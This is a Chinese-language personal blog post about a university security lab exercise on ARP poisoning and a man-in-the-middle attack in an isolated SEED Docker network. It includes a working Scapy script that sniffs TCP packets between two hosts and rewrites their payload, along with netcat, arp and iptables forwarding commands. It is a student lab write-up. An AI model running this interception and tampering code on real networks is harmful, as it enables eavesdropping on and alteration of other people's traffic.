---
title: "520和安全一同度过"
date: 2024-03-01T01:43:35.000Z
lastmod: 2024-05-22T14:06:05.481Z
draft: false
author: "Tardfyou"
description: "继承与磨练"
summary: "继承与磨练"
slug: "520晚上的攻防浪漫"
aliases:
  - "/2024/03/01/520晚上的攻防浪漫/"
tags:
  - "learning"
categories:
  - "way of life"
images:
  - "https://seaside-station.com/wpbin/wp-content/uploads/seihama_02.jpg"
lightgallery: true
---

# 那个晚上
谁家好人在这天全天满课啊，没错就是我了。20号的晚上我正式开始了安全综合实践课程，由于本次实验二内容很有趣因此在这里分享一下大致过程。

## 内容
内网攻防，arp中毒和netcat传输tcp数据包篡改。

## 环境
Ubuntu Seed，网段192.168.60.0/24
设备：攻击机HostM：192.168.60.3 eth0，被攻击机HostA：192.168.60.2，eth0，网关HostB：192.168.60.1，docker2。

## 要求
M进行arp中毒和中间人流量转发，A nc连接网关 B，M开启ip转发判断是否实现中间人，然后关闭ip转发，保持中毒状态，运行TCP数据包嗅探篡改和转发脚本，实现将A发往B的数据由123篡改为456。

## 代码实现
### arp毒化和中间人伪造
![](/images/poi1.png)
![](/images/poi2.png)
![](/images/poi3.png)
### 监听脚本 listen.py
```
#!/usr/bin/python

from scapy.all import *

MAC_A = "02:42:c0:a8:3c:02"
MAC_B = "02:42:c9:92:f0:d5"

def spoof_pkt(pkt):
    a = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    b = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    data = bytes(pkt[TCP].payload)  # 将payload转换为字节串
    print("**** %s, length: %d" % (data, len(data)))
    newdata = data.replace(b'123', b'456')  # 使用字节串替换
    newpkt = a/b/newdata

    send(newpkt)

f = 'tcp and (ether src ' + MAC_A + ' or ether src ' + MAC_B + ' )'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

### 最终结果
![](/images/520result.png)

### 其它有关代码
```
nc -ln 9090
nc <ip> <port>

docker run <name>
docker start <name>
docker exec -it <name> /bin/bash
docker ps -a
docker cp  <name>:/../..  test.txt
docker cp test.txt <name>:/../..
arp -a
arp -d <ip>
arp -n

sudo -i
Iptables -P FORWARD ACCEPT
```
![life is a long way](https://seaside-station.com/wpbin/wp-content/uploads/nebukawa_28.jpg)
